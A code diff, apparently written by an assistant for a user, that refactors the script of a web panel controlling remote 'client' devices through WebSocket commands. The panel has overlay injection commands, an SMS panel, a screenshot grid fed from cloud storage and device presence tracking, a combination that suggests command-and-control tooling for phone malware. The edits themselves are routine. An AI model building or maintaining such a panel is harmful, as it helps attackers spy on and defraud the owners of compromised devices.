@@ -296,11 +296,31 @@
 <script>
 /* ---------------------------
    Compatibility & helpers
-   - Keeps your original sendCmd endpoint and IDs
 ----------------------------*/
 function pad(n){ return n < 10 ? "0"+n : n; }
 function truncate(s,n){ return s.length > n ? s.slice(0,n-3) + "..." : s; }
 function escapeHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+/* --- get clientId robustly from path or query --- */
+(function(){
+  const pathParts = location.pathname.split('/').filter(p=>p && p.length);
+  // If path ends with "device" then maybe clientId is missing; fallback to 'id' query param
+  let cid = null;
+  if (pathParts.length) {
+    // If last segment looks like uuid-ish (contains '-') or length>2 treat as client id
+    cid = pathParts[pathParts.length-1];
+    // If last segment is the word "device" maybe clientId is next segment (handle /device/<id>)
+    if (cid === 'device' && pathParts.length >= 2) {
+      cid = pathParts[pathParts.length-2];
+    }
+  }
+  // fallback to query params `id` or `clientId`
+  if (!cid) {
+    const qs = new URLSearchParams(location.search);
+    cid = qs.get('id') || qs.get('clientId') || null;
+  }
+  window.clientId = cid || 'unknown';
+})();
 
 /* --- sendCmd: same API you used before --- */
 async function sendCmd(cmd) {
@@ -343,7 +363,7 @@ document.getElementById("btnCustomOverlay").onclick = () => {
   sendCmd(cmd);
 };
 document.getElementById("btnStopOverlay").onclick = () => sendCmd("stop-overlay");
-document.getElementById("btnClose").onclick = () => window.close();
+document.getElementById("btnClose")?.addEventListener("click", ()=> window.close());
 
 /* Right icon bar wiring (preserve command mapping) */
 document.querySelectorAll("#rightbar .icon-btn").forEach(b=>{
@@ -363,15 +383,13 @@ document.querySelectorAll(".tab").forEach(t=>{
   });
 });
 
-/* WebSocket + panels wiring (keeps your original behavior) */
-const pathParts = window.location.pathname.split("/");
-const clientId = pathParts[pathParts.length - 1] || "unknown";
+/* Panels & helpers */
 const urlParams = new URLSearchParams(location.search);
-const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
+const deviceName = decodeURIComponent(urlParams.get("name") || window.clientId || "Device");
 
 document.getElementById("devName").textContent = deviceName;
-document.getElementById("devId").textContent = clientId;
-document.getElementById("devIdTop").textContent = clientId;
+document.getElementById("devId").textContent = window.clientId;
+document.getElementById("devIdTop").textContent = window.clientId;
 
 const logPanel = document.getElementById("panelLogs");
 const smsPanel = document.getElementById("panelSms");
@@ -392,10 +410,10 @@ function pushLog(msg){
 
 /* Smart routing of incoming responses to panels */
 function routeMessageToPanel(output){
-  const low = output.toLowerCase();
+  const low = String(output).toLowerCase();
 
   // Screenshot detection (preserve your previous rule)
-  if (output.includes("supabase.co") || output.includes("s3.") || output.includes("storage.googleapis")) {
+  if (String(output).includes("supabase.co") || low.includes("s3.") || low.includes("storage.googleapis")) {
     addScreenshotToGrid(output);
     const el = document.createElement("div");
     el.innerHTML = `<b>Screenshot:</b> <a href="${escapeHtml(output)}" target="_blank">${escapeHtml(truncate(output,60))}</a>`;
@@ -440,7 +458,7 @@ function routeMessageToPanel(output){
     return;
   }
 
-  // Default: nothing else — leave in logs and done.
+  // Default: nothing else — leave in logs
 }
 
 /* WebSocket connection (re-uses your path + host logic) */
@@ -457,7 +475,7 @@ ws.onmessage = (evt) => {
 
     // Update devices presence if included
     if (msg.type === "devices") {
-      const d = msg.devices && msg.devices[clientId];
+      const d = msg.devices && msg.devices[window.clientId];
       if (d && d.online) {
         document.getElementById("status").textContent = "Online";
         document.getElementById("status").style.color = "#7ef0c3";
@@ -468,7 +486,7 @@ ws.onmessage = (evt) => {
     }
 
     // Response messages
-    if (msg.type === "response" && msg.clientId === clientId) {
+    if (msg.type === "response" && msg.clientId === window.clientId) {
       pushLog(`📩 Response: ${msg.output}`);
       routeMessageToPanel(msg.output);
     }
